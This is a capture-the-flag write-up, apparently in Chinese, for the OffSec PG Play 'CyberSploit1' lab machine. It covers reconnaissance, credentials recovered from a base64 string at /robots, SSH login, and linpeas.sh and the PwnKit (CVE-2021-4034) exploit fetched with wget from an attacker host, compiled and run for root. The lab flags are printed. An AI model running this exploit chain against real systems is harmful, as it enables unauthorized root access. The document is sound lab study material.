###### tags: `Offsec` `PG Play` `Easy` `Linux`

# CyberSploit1
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.215.92 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.215.92:22
Open 192.168.215.92:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hello Pentester!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

查看`192.168.215.92`按下F12發現有一個`username:itsskv`
再查看`192.168.215.92/robots`發現有一個base64，decode可發現密碼
```
┌──(kali㉿kali)-[~/pgplay]
└─$ curl 192.168.215.92/robots              
Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=

┌──(kali㉿kali)-[~/pgplay]
└─$ curl 192.168.215.92/robots | base64 -d 
cybersploit{youtube.com/c/cybersploit}
```

ssh登入，在`/home/itsskv`找到local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh itsskv@192.168.215.92        
itsskv@192.168.215.92's password: cybersploit{youtube.com/c/cybersploit}

itsskv@cybersploit-CTF:~$ cat local.txt
52924b0e2385c903d5b5e3c1966c5bab
```

跑`linpeas.sh`
```
itsskv@cybersploit-CTF:~$ wget 192.168.45.242/linpeas.sh
itsskv@cybersploit-CTF:~$ chmod +x linpeas.sh
itsskv@cybersploit-CTF:~$ ./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester 
...
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
...
```

試[CVE-2021-4034](https://github.com/ly4k/PwnKit)，在/root得`proof.txt`
```
itsskv@cybersploit-CTF:~$ wget 192.168.45.242/PwnKit.c
itsskv@cybersploit-CTF:~$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
itsskv@cybersploit-CTF:~$ chmod +x ./PwnKit
itsskv@cybersploit-CTF:~$ ./PwnKit
root@cybersploit-CTF:/home/itsskv#
root@cybersploit-CTF:~# cat proof.txt
abd91925ddfaa245fbffd262261abacb
```